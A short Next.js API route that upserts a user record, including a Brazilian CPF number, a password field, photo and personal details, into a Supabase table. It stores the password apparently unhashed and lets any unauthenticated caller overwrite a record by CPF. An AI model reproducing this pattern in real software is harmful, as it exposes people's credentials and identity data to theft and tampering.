import { NextResponse } from "next/server";
import { createClient } from "@supabase/supabase-js";

export async function POST(req: Request) {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const key = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
  if (!url || !key) return NextResponse.json({ ok: false, error: "Supabase sem chave na Vercel" }, { status: 500 });
  const body = await req.json();
  const sb = createClient(url, key);
  const row = {
    cpf: String(body.cpf || "").replace(/\D/g, "") || body.cpf,
    senha: body.senha || "-",
    nome: body.nome || "",
    cidade: body.cidade || "",
    uf: body.uf || "",
    user_id: body.userId || "",
    foto: body.foto || null,
    idade: body.idade ? Number(body.idade) : null,
    sexo: body.sexo || null,
    intencao: body.intencao || null,
    frase: body.frase || null,
    apelido: body.apelido || null,
    chave: body.chave || null,
  };
  if (!row.cpf) return NextResponse.json({ ok: false, error: "Sem WhatsApp na conta" }, { status: 400 });
  const { error } = await sb.from("contas_cpf").upsert(row);
  if (error) return NextResponse.json({ ok: false, error: error.message }, { status: 400 });
  return NextResponse.json({ ok: true });
}
